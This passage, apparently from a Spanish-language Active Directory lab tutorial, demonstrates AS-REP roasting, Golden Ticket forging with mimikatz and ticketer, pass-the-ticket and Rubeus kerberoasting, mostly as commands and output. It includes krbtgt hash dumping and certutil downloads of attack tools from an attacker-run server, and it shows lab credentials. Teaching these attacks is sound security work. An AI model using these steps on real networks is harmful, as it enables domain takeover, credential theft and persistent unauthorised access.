❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
                               
❯ cat users
   1   │ Administrator
   2   │ Guest
   3   │ krbtgt
   4   │ cordy
   5   │ usuario
   6   │ mrincognito
   7   │ svc_sql
```

Ahora, usemos `impacket-GetNPUsers`, usando como diccionario de usuarios la lista anteriormente creada:

```zsh
❯ impacket-GetNPUsers waidroc.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User cordy doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$usuario@waidroc.LOCAL:bf1356b316a8cc98ef0f70e0f2028e51$7a4020b832ea1841526e941a86df02799a70cd8e1388451a003ce5cacf37e0bb273aa316635c955818050780b0934d4866a324f98099c3b1fccdabc856379c1dfe8481c5e197fcc2edaecff13bc8963ec851a1cb27c43418dba35d11e45f3545f4cb6f617f461225e047093df563f76791cb902cdad18d1e1051512ddf71b63321bd766581c6992eb88034038de2573a780a14cd1317e1b9a6e510a6ffeb519ae61acb824b16b4cc82abb0b593ee97d304623970a655854bd51b3bf42dcddcc0cf148344e77ff05a2f4efc1dbc232cac5fd7d2c6d862036f2917d0cc1074af7a20eef01fa9e29d290e5900becca7f172
[-] User mrincognito doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Podemos ver que `usuario` es vulnerable a este tipo de ataques, ya que no necesita una pre-autenticación con Kerberos (is not set).

Vamos a intentar crackear este hash obtenido:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password2        ($krb5asrep$23$usuario@waidroc.LOCAL)     
1g 0:00:00:00 DONE (2023-05-25 20:06) 10.00g/s 542720p/s 542720c/s 542720C/s soydivina..250984
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Hemos obtenido la credencial! `usuario:Password2`.

## Golden Ticket Attack

- - -

![GOLDENTICKET](/assets/img/2023-09-01/gticket.jpg)

Para este tipo de ataque, nosotros como atacantes tendríamos que explotar el sistema de autenticación de tickets Kerberos, que se utiliza comúnmente en entornos de redes corporativas. Crearíamos un `ticket falso` con un período de `validez extremadamente largo`, conocido como `Golden Ticket`.
Para generar este ticket forjado, necesitaríamos acceso a la clave de cifrado de la cuenta de dominio, también conocida como "clave maestra de cuenta de dominio" o "clave de cifrado de dominio". Esta clave se puede obtener comprometiendo un controlador de dominio de Windows y extrayéndola de la memoria del sistema.

Una vez que hayamos creado exitosamente el "Golden Ticket", podemos utilizarlo para autenticarnos dentro del sistema Kerberos sin necesidad de credenciales de usuario legítimas. Este ataque nos otorgaría acceso completo y privilegios de administrador en la red comprometida.

![GOLDENTICKETW](/assets/img/2023-09-01/goldenticket.png)

Realizaremos este ataque con las siguientes herramientas:

- **Ticketer**
- **Rubeus**
- **Bloodhound**
- **neo4j**
- **Mimikatz**

### Method 1: .kirbi file

- - -

Lo primero de todo, nos conectmos al sistema con `psexec.py` o `evil-winrm`. En este caso, nos conectaremos con `mrincognito`:

```zsh
❯ psexec.py waidroc.local/mrincognito:Password123@192.168.10.115 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.10.115.....
[*] Found writable share ADMIN$
[*] Uploading file rUVzgArK.exe
[*] Opening SVCManager on 192.168.10.115.....
[*] Creating service DRyl on 192.168.10.115.....
[*] Starting service DRyl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Windows\Temp

C:\Windows\Temp> mkdir GDTicket

C:\Windows\Temp> cd GDTicket

C:\Windows\Temp\GDTicket> 
```

Ahora, nos pasaremos `mimikatz` desde nuestra máquina atacante al host víctima al cual acabamos de ralizar la conexión:

```zsh
❯ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe

❯ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
En la máquina víctima, nos descargamos el fichero gracias al servidor web que acabamos de crear:

```zsh
C:\Windows\Temp\GDTicket> certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
****  Online  ****
  000000  ...
  14ae00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\GDTicket> 
```

Ahora, tenemos la herramienta `mimikatz.exe` en la víctima.

```zsh
C:\Windows\Temp\GDTicket> ls

C:\Windows\Temp\GDTicket

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/25/2023  13:47 AM        1355264 mimikatz.exe 
```

Ejecutamos `mimikatz`:

```zsh
c:\Users\mrincognito\Documents> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : waidroc / S-1-5-21-1320512025-754860945-2616689224

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : acf2d0133c0db165efbca5b44072e10a
    LM   : 
  Hash NTLM: acf2d0133c0db165efbca5b44072e10a
    ntlm- 0: acf2d0133c0db165efbca5b44072e10a
    lm  - 0: 7c43f505c7c846fd717111b40314bed9

 * WDigest
    01  becd6e5b902001e4311b7bdbfc616031
    02  7587f91c21753f6fbe9eb8b8da365e6b
    03  71d8c305785dc975c00293292408192d
    04  becd6e5b902001e4311b7bdbfc616031
    05  7587f91c21753f6fbe9eb8b8da365e6b
    06  8979ba2d3ed2899b51e913dbf0589aa0
    07  becd6e5b902001e4311b7bdbfc616031
    08  aa5360f6ebc9404ec9467eee12cff14f
    09  aa5360f6ebc9404ec9467eee12cff14f
    10  6cae5c036d13230cc1c4e9475458b2c2
    11  f8c169dbb3cd7fe2e9ca3b40496234d9
    12  aa5360f6ebc9404ec9467eee12cff14f
    13  a1c5d888375231016315508851f5fa22
    14  f8c169dbb3cd7fe2e9ca3b40496234d9
    15  cabd6d44d9d044557f2a70876b33ddd2
    16  cabd6d44d9d044557f2a70876b33ddd2
    17  fd87e62f461e64a2eac2f0407d6303d1
    18  da9e6811c137a7879777a7edd60ef7e2
    19  400a9a0b7f78941171b49dcc80565631
    20  11cc87b72975c480ca7878f24afb9a0a
    21  583a2c5907503eac51c296a449e6babd
    22  583a2c5907503eac51c296a449e6babd
    23  1eec8adf97193c62284290a9047eb4c2
    24  f647307f7fc269babc29ed18c4345395
    25  f647307f7fc269babc29ed18c4345395
    26  2a3eec21d946168baf578861e808c48f
    27  483f4565111d3a09f4d782cb45ab8e88
    28  b5485e3d693914153709f0be58292012
    29  d5ed6cf3ae96c0e19ed63e48d3d069b4

 * Kerberos
    Default Salt : waidroc.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 08232331ec589885

 * Kerberos-Newer-Keys
    Default Salt : waidroc.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e890d33a55364e1c8c745308026e6703196558965d334fdd10f51ad8cf597a8d
      aes128_hmac       (4096) : ea6d7106e9a6b25147f1eed37ce4fe9e
      des_cbc_md5       (4096) : 08232331ec589885

 * NTLM-Strong-NTOWF
    Random Value : b6ed8da91bfbf1ea3ff3314d069ebb1c
mimikatz #
```

Guardamos lo que nos reporta.

Ahora, le introducimos los siguientes parámetros para crear el **Golden Ticket**:

```zsh
mimikatz # kerberos::golden /domain:waidroc.local /sid:S-1-5-21-1320512025-754860945-2616689224 /rc4:acf2d0133c0db165efbca5b44072e10a /user:Administrator /ticket:golden.kirbi
User      : Administrator
Domain    : waidroc.local (waidroc)
SID       : S-1-5-21-1320512025-754860945-2616689224
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: acf2d0133c0db165efbca5b44072e10a - rc4_hmac_nt      
Lifetime  : 5/25/2023 11:54:50 AM ; 5/22/2033 11:54:50 AM ; 5/22/2033 11:54:50 AM
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Explicación de los parámetros utilizados:
- `/domain` DC Domain
- `/sid` KRBGT user ID
- `/rc4`  NTLM hash
- `/user` El usuario que queremos suplantar
- `/ticket` El nombre del ticket

Con esto, habremos generado un fichero `.kirbi`:

```zsh
c:\Users\mrincognito\Documents> dir
 Volume in drive C has no label.
 Volume Serial Number is FE91-24FB

 Directory of c:\Users\mrincognito\Documents

05/25/2023  11:54 AM    <DIR>          .
05/25/2023  11:54 AM    <DIR>          ..
05/25/2023  11:54 AM             1,409 golden.kirbi
05/25/2023  11:39 AM         1,250,056 mimikatz.exe
               3 File(s)      1,255,734 bytes
               2 Dir(s)  13,660,475,392 bytes free

c:\Users\mrincognito\Documents> 
```

Ahora, necesitaremos tener el fichero `.kirbi` en nuestra máquina atacante. Nos transferimos el fichero de la siguiente manera:

```zsh
C:\users\mrincognito\documents> download golden.kirbi
Info: Downloading golden.kirbi to ./golden.kirbi
                                                       
Info: Download successful!

C:\users\mrincognito\documents> 
```

Ahora tendremos el fichero en nuestra máquina atacante.
El siguiente paso será conectarse, por ejemplo, a la máquina de `cordy`. Somos administradores del dominio, por lo que podemos poner la dirección IP que deseamos y conectarnos exitosamente:

```zsh
❯ psexec.py waidroc.local/Administrator:P@\$\$w0rd\!@192.168.10.120 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.10.120.....
[*] Found writable share ADMIN$
[*] Uploading file Rplbrtld.exe
[*] Opening SVCManager on 192.168.10.120.....
[*] Creating service zlVv on 192.168.10.120.....
[*] Starting service zlVv.....
[!] Press help for extra shell commands
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
```

Si intentamos listar los ficheros que hay en `C$` como el usuario `cordy` (W2-PC), obtendremos un mensaje de `Access denied`:

```zsh
PS C:\Windows\Temp\test> dir \\W2-PC\C$
dir \\W2-PC\C$
dir : Acceso denegado
En lnea: 1 Carcter: 1
+ dir \\W2-PC\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\W2-PC\C$:String) [Get-ChildItem], UnauthorizedAccessExcep 
   tion
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
 
dir : No se encuentra la ruta de acceso '\\W2-PC\C$' porque no existe.
En lnea: 1 Carcter: 1
+ dir \\W2-PC\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\W2-PC\C$:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
 
PS C:\Windows\Temp\test> 
```

Aquí es cuando usaremos el **Golden Ticket** generado (fichero .kirbi). Vamos a movernos al directorio temporal (`C:\Windows\Temp\`). Necesitaremos descargar `mimikatz` y el `golden.kirbi` al `W2-PC` del usuario `cordy`:

```zsh
PS C:\Windows\Temp\test> certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
certutil.exe -urlcache -f -split http://192.168.0.106:8080/mimikatz.exe
****  En lnea  ****
  000000  ...
  14ae00
CertUtil: -URLCache comando completado correctamente.
PS C:\Windows\Temp\test> certutil.exe -urlcache -f -split http://192.168.0.106:8080/golden.kirbi
certutil.exe -urlcache -f -split http://192.168.0.106:8080/golden.kirbi
****  En lnea  ****
  0000  ...
  0581
CertUtil: -URLCache comando completado correctamente.
PS C:\Windows\Temp\test> 
```

Al fin, vamos a realizar el ataque `pass the ticket`:

```zsh
PS C:\Windows\Temp\test> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt golden.kirbi

* File: 'golden.kirbi': OK

mimikatz # exit
Bye!
PS C:\Windows\Temp\test> dir \\192.168.10.115\c$
dir \\192.168.10.115\c$


    Directory: \\192.168.10.115\c$


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/5/2022  11:21 AM                PerfLogs                                                              
d-r---        5/23/2023   8:46 AM                Program Files                                                         
d-----        5/23/2023   8:46 AM                Program Files (x86)                                                   
d-r---        5/25/2023   8:37 AM                Users                                                                 
d-----        5/26/2023   8:49 AM                Windows                                                               


PS C:\Windows\Temp\test> 
```

El ataque se ha hecho satisfactoriamente!

### Method 2: .ccache file

- - -

Para este método, vamos a usar la famosa herramienta llamada [`ticketer`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py). Ésta, nos permitirá ganar acceso al DC.

```zsh
❯ ticketer.py -nthash acf2d0133c0db165efbca5b44072e10a -domain-sid S-1-5-21-1320512025-754860945-2616689224 -domain waidroc.local Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for waidroc.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Al usar estos parámetros, nos autenticará con el usuario krbtgt y solicitará un archivo `.ccache` de la caché del Administrador:

```zsh
❯ ls
Administrator.ccache  golden.kirbi  mimikatz.exe  report
```

Para tener **persistencia permanente** en este Controlador de Dominio, necesitamos exportar una variable del sistema llamada `KRB5CCNAME` igual al archivo `.ccache`:

```zsh
❯ export KRB5CCNAME="/home/waidroc/Escritorio/ActiveDirectory/GoldenTicket/Administrator.ccache"
```

Comprobamos que la variable se ha exportado correctamente:


```zsh
❯ ls -l $KRB5CCNAME
-rw-r--r-- 1 root root 1185 may 26 18:05 /home/waidroc/Escritorio/ActiveDirectory/GoldenTicket/Administrator.ccache
```

Modificamos el fichero de configuración [`krb5.conf`](https://web.mit.edu/kerberos/krb5-1.11/doc/admin/conf_files/krb5_conf.html), indicandole el .ccache.

Hecho esto, podremos acceder al DC sin ningún tipo de credencial.

```zsh
❯ psexec.py -n -k waidroc.local/Administrator@W2-PC cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.10.115.....
[*] Found writable share ADMIN$
[*] Uploading file AouVevOZ.exe
[*] Opening SVCManager on 192.168.10.115.....
[*] Creating service ehpS on 192.168.10.115.....
[*] Starting service ehpS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

> Debemos de tener muy en cuenta que, aunque el Administrador cambie su contreña, no importa. Tendremos acceso total y persistente en el Controlador de Dominio.
{: .prompt-info}


## Rubeus - Kerberoasting

- - -

![Rubeus](/assets/img/2023-09-01/rubeus.png)


La diferencia entre el Kerberoasting regular y el Kerberoasting de Rubeus radica en las herramientas utilizadas para llevar a cabo el ataque y las características adicionales proporcionadas por Rubeus.

El Kerberoasting regular generalmente se refiere a la técnica o concepto general de explotar la vulnerabilidad en Kerberos para extraer y descifrar las contraseñas de cuentas de servicio. Implica identificar cuentas de servicio, solicitar tickets de servicio (TGS) para esas cuentas y descifrar offline los tickets de servicio cifrados para obtener las contraseñas en texto plano. El Kerberoasting regular se puede realizar utilizando diversas herramientas y scripts, o incluso manualmente.

Por otro lado, Rubeus es una herramienta específica desarrollada por Harmj0y como parte del framework Impacket. Rubeus está diseñado para ayudar en varios ataques relacionados con Kerberos, incluido el Kerberoasting. Proporciona funcionalidades y características adicionales específicamente destinadas a simplificar y automatizar el proceso de Kerberoasting. Algunas diferencias y ventajas notables del Kerberoasting de Rubeus incluyen:

- **Funcionalidad mejorada**: Rubeus ofrece funcionalidad integrada para enumerar cuentas de servicio, solicitar tickets de servicio y realizar descifrado offline. Simplifica los pasos involucrados en el proceso de ataque de Kerberoasting.

- **Ataques de diccionario y fuerza bruta**: Rubeus admite métodos de descifrado de contraseñas basados en diccionario y fuerza bruta contra los tickets de servicio cifrados. Proporciona opciones para especificar listas de palabras personalizadas y reglas de complejidad de contraseñas.

- **Opciones de filtrado**: Rubeus permite filtrar las cuentas de servicio en función de varios criterios, como el nombre del SPN, el nombre de la cuenta o grupos de usuarios específicos. Esto permite ataques de Kerberoasting más dirigidos y eficientes.

- **Automatización y scripting**: Rubeus se puede utilizar en scripts y automatizar, lo que permite el procesamiento por lotes de múltiples cuentas de servicio. Esto puede ser especialmente útil al tratar con un gran número de cuentas de servicio en el dominio.

- **Características extendidas**: Rubeus ofrece características adicionales más allá del Kerberoasting, como obtención de tickets, ataques pass-the-ticket y generación de Golden Tickets. Estas características hacen de Rubeus una herramienta versátil para varios ataques relacionados con Kerberos.

**En resumen**, mientras que el Kerberoasting regular se refiere a la técnica general de explotar vulnerabilidades en Kerberos para descifrar contraseñas de cuentas de servicio, el Kerberoasting de Rubeus se refiere específicamente al uso de la herramienta Rubeus para automatizar y simplificar el proceso de Kerberoasting al tiempo que proporciona características adicionales y flexibilidad.


### Prueba de concepto (PoC)

- - -

Lo primero, es localizar `Rubeus` en nuestro sistema y moverlo a nuestro directorio de trabajo:

```zsh
❯ locate Rubeus
/home/waidroc/Escritorio/Rubeus-1.6.4.zip
/home/waidroc/Escritorio/Rubeus.exe

❯ mv /home/waidroc/Escritorio/Rubeus.exe .

❯ ls
192.168.10.120_samhashes.sam  BloodHound-linux-x64  document.pdf  hash     Invoke-RunasCs.ps1  mimikatz  nc.exe         PDF-Icon.ico  PS.ps1             rpcenum.sh  target   users
ADCSTemplate.psm1            Certify               GoldenTicket  ico.png  kerbrute            mitm6     ntlmrelayx.py  PDF-Icon.png  Reverse-Shell.ps1  Rubeus.exe  targets
```

Si no tienes la herramienta, puedes descargarla directamente clicando [`aquí`](https://github.com/GhostPack/Rubeus).

Después. subimos `Rubeus` al DC:

```zsh
PS C:\Windows\Temp> certutil.exe -urlcache -f -split http://192.168.10.106/Rubeus.exe
certutil.exe -urlcache -f -split http://192.168.10.106/Rubeus.exe
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp> 
```

Si miramos el manual, es demasiado extenso y tiene muchísimos parámetros con diversas funcionalidades. En este caso, vamos a centrarnos en la función `kerberoast`:

```zsh
PS C:\Windows\Temp> ./Rubeus.exe kerberoast /creduser:waidroc.local\usuario /credpassword:Password2
./Rubeus.exe kerberoast /creduser:waidroc.local\usuario /credpassword:Password2

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : waidroc.local
[*] Searching path 'LDAP://W2-PC.waidroc.local/DC=waidroc,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=SVC_SQLService,CN=Users,DC=waidroc,DC=local
[*] ServicePrincipalName   : waidroc.local/svc_sql.W2-PC
[*] PwdLastSet             : 5/25/2023 9:25:04 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$waidroc.local$waidroc.local/svc_sql.W2-PC@waidroc
                             4ft.local*$95D51059FE38B26D45E19223C1CBDCEE$1EF269B1BEC6C04EB4C1C514C99A7781EBF7
                             4D909F37EEC43B52DEE98791EC3212B4E1D057C728934BE57A9C2675A83053734D09DE09E5E2AD89
                             BAAFE6FB8BA56E4919DD4BC3C499E5697D919DAE0BA9994389A5878EDAADE70CE86E883E5AEAF0D2
                             5DB3AB04E05E760353089D13587992D2A347CF7DE9B4FA1E00AFE26A63A2F251D08ECA0737426633
                             F699C64209A00AC936873734E33765B87FE31DC6DF711E9F8A822BB3550B70C75B03E6E5905B2B60
                             18E3652ED4E5448605291AED8821BCC12B76D8A55BC38B2DA00ECF5CFD290D3D3AA078C16B171C4C
                             A1410B42D04833D9805D795F44AFED44FFA2B79B87AAB312AF9C9E194C0E4CFA13E8E3D2A4B0969D
                             15ED41A8457608F3AD41B324E8359DE4EAC32BAB486EA0EF7167E7082D3FF197C718FB2D1514E04F
                             46A57091EC302B698CBCB8007A1987C2477698954CD505F7B77438D0D62D2F7319548D7C7A5234A4
                             493DAA030DEFC392874DCB1AA3CF1193B9F9E5B1A67188E21AE63373FF08BBB109C24A504B638AC5
                             6ECAAE2232C08BC2E94C222B5B569E30B57AD7D06D1CCCE4BF1DB5156EA3954EE0FD4EF7B837887C
                             E94A82154448D066EF29F160B93FBAD34324D342C5A938B39ED6868A1BE48D60F54EA7217835CCE5
                             C52D6C7A4A3149C79DD20EFE81ADBF895174C45507AE27D7C07C917DC8FAB4C11C0AF07C08D4B95F
                             3698890B92A3161E6960CA7F3B9F97A130DF94F442A016153FB42BE5423B38B379BF7AEAD3A98EFA
                             D465840B1C2CEAA61D3BD563F6FD3F4FA64AF64EA69D0339D0990EBA47ECA6B0A2DF83039BD265BE
                             28EBDF10FD61F290D89FFBFD1C5634E9BFB25404C6146D456631CDF1F528C8807B2866A434FFADFE
                             F91B6199095B01A254F05B698ED470A5CFDA01019A6F7978F3A2FC0213D6B84F0F799AAC6D7784A0
                             1BE0DA8B16B34F6A9E98A1265BDA3C59566800E3AB9809C60ABA77EF0B3E45137D875F2976203AD0
                             83B6BAC7F5A612EA35AC98876749FCBF2C197093F4A845D69F943E82E305AF1E2DFAE0EB66A87799
                             EB0E66CAB1CBB20C8173772F0302672077CF2891F1C5D136AF239DF8CF041C607AA758AC5CA7D687
                             FA3326EA4E909424B7B7F03DEB11D78E13AF0868ABE8736E54712F6F95D5FCCE74C12662C9F7F215
                             BB770F753506F622541C7174FC283904C6AFD93EEF36DAA0BB7F3598FA6598B8C0E28041454129AA
                             8DCE8B2BAD2EA9D803004DA73FF0EB35C38532F57246D735337CE32F8D734F3D4A3CE322D51A95AB
                             121A93C4759FD45D9F5384EFCF95E1D724249029747D31A80A5141DAC1DDFD6C11290F086348FA96
                             C0ACD76A44D5CE1E0A1C42CA714F5E1D50666B737A7637D3EAA5AF59F847E1C68F82D3E68A82E7CC
                             D5E1AA3CDFB72CFB773CA6417533A3436FC57FC956586E6C8C9A3992EDA8C68D1882ACC8B1FF8233
                             6EF9DBCC8D3231CE3C8D587363DFC2A0223779FD7AE12E21C57F012B36CD8E37BADD62984B9A060F
                             382DE52702BE46734D77811D13741DF6DBC6B515AD4A1891A5D972EC1B0449CFDCF1667B717C1BA0
                             9D46D120B34E1E56FF8C45AEE167222C675ADCDF9B5E6F1535EFA69E25184D28BEE173CD149CFC8F
                             E81DD142F5A4913371694D0AFDD98C74A03CC5B2BE0BC4E8B8EDFB9CC27BB41CCDA355F1898206CA
                             1B

PS C:\Windows\Temp> 
```

Al igual que en el `kerberoasting` tradicional, podemos usar **cualquier credencial** mientras sea válida.
Por último, intentaríamos crackear alguna credencial reportada con `john`.

## Rubeus - AS-REP Roast

- - -

El ataque AS-REP Roast es una técnica utilizada para extraer mensajes AS-REP (Respuesta del Servicio de Autenticación) cifrados de un controlador de dominio en un entorno de Windows Active Directory. Este ataque se dirige a cuentas de usuario que tienen habilitada la bandera "No requerir preautenticación Kerberos", lo que permite la extracción del mensaje AS-REP cifrado y su posterior descifrado offline.

La principal diferencia entre un ataque AS-REP Roast regular y un ataque AS-REP Roast utilizando Rubeus radica en las herramientas utilizadas y las características adicionales proporcionadas por Rubeus.

En un ataque AS-REP Roast regular, normalmente se utilizan métodos manuales o scripts personalizados para identificar cuentas de usuario con la bandera de preautenticación deshabilitada, extraer los mensajes AS-REP y tratar de descifrarlos utilizando técnicas offline como ataques de diccionario o fuerza bruta.

Por otro lado, Rubeus es una herramienta dentro del framework Impacket diseñada específicamente para automatizar y simplificar ataques relacionados con Kerberos. Ofrece funcionalidades para realizar ataques AS-REP Roast y presenta varias ventajas:

- **Automatización del ataque AS-REP Roast**: Rubeus agiliza el proceso de ataque AS-REP Roast al automatizar la extracción de mensajes AS-REP desde el controlador de dominio.

- **Funcionalidad mejorada**: Rubeus ofrece características adicionales más allá del ataque AS-REP Roast, como la capacidad de solicitar y extraer tickets TGT (Ticket Granting Ticket), manipular tickets Kerberos, realizar ataques pass-the-ticket y más.

- **Formatos de salida flexibles**: Rubeus ofrece opciones para mostrar los mensajes AS-REP extraídos en varios formatos, facilitando el procesamiento y análisis de los resultados.

- **Técnicas adicionales de ataque**: Rubeus incluye otras técnicas de ataque relacionadas con Kerberos, como Kerberoasting, ataques de Golden Ticket y ataques de Silver Ticket, permitiendo una variedad más amplia de escenarios de ataque.

En resumen, aunque tanto los ataques AS-REP Roast regulares como los ataques AS-REP Roast utilizando Rubeus apuntan a la misma vulnerabilidad, Rubeus proporciona un enfoque más ágil y rico en características para automatizar el proceso de ataque, extraer mensajes AS-REP y realizar técnicas adicionales de ataque relacionadas con Kerberos.

### PoC

- - -

El procedimiento es igual que hemos hecho anteriormente: subimos `Rubeus` y ejecutamos el siguiente comando:


```zsh
PS C:\Windows\Temp> ./Rubeus.exe asreproast /user:mrincognito /domain:waidroc.local /dc:W2-PC
./Rubeus.exe asreproast /user:mrincognito /domain:waidroc.local /dc:W2-PC

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: AS-REP roasting

[*] Target User            : mrincognito
[*] Target Domain          : waidroc.local
[*] Target DC              : W2-PC

[*] Using domain controller: W2-PC (fe80::1e2e:ac4a:2102:569f%5)
[*] Building AS-REQ (w/o preauth) for: 'waidroc.local\mrincognito'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$mrincognito@waidroc.local:57F0D065B280E399D0B60C088D2EC546$8982D5AEA3582
      9651543BFD969A339CE0EF7BC17B3217CFFB27531E6DC514379CD896023D2D884113CFF20CB5720D
      2D82D51FC5D4426FF56905BB2C1197C6BF7FB7B45CA4ADA7191A1BB97D8622F02AF7DACBC5F73DA4
      10156D73733EE8420861B44732FCB2DD8BC40281242C3F8B8E48AC1A96E8ABFD074BA21432191CC1
      D3DC37F3F637B422BB19FC9B9712E530A1168CB2C1BC8E66987B0AF8235D5E768AFE15D095ECC3B8
      4AEFD294D8F6BBDA0A3D14BD00CB74722698989759E94933D3253896A6A9AFF6641893E73B35BCC7
      8EE90C69587B8D7F1924C4FCFFD28A8B3BEF45C5E08DD603FEB434233594E9A5A31

PS C:\Windows\Temp> 
```

Como siempre, podemos copiar el hash que nos ha volcado e intentamos crackearlo.

## SCF Files

- - -

Un archivo SCF, también conocido como "Shell Command File" (Archivo de Comando de Shell), es un formato de archivo utilizado en sistemas operativos Windows. Está asociado principalmente con el Shell del Explorador de Windows, que proporciona la interfaz gráfica de usuario (GUI) para interactuar con archivos, carpetas y operaciones del sistema.

Un archivo SCF es un archivo de texto que contiene una serie de comandos que se ejecutan cuando el archivo se abre o se accede. Estos comandos pueden incluir diversas acciones, como el lanzamiento de aplicaciones, la ejecución de scripts o la realización de operaciones del sistema.

En el contexto de Windows, los archivos SCF se utilizan típicamente con fines de personalización y automatización. Los usuarios pueden crear archivos SCF para realizar tareas específicas o automatizar acciones repetitivas. Por ejemplo, un archivo SCF puede contener comandos para abrir carpetas específicas, lanzar aplicaciones con configuraciones predefinidas o realizar configuraciones del sistema.

> No se debe confundir con la utilidad de Windows SFC (System File Checker), la cual sirve para verificar y reparar archivos del sistema operativo dañados.
{: .prompt-danger}

### Prueba de Conceptos (PoC)

- - -

Inicialmente, listamos los `recursos compartidos`:

```zsh
❯ smbclient -U "waidroc.local\usuario%Password2" -L 192.168.10.115 -smb2support
Can't load mb2support - run testparm to debug it

	Sharename       Type      Comment
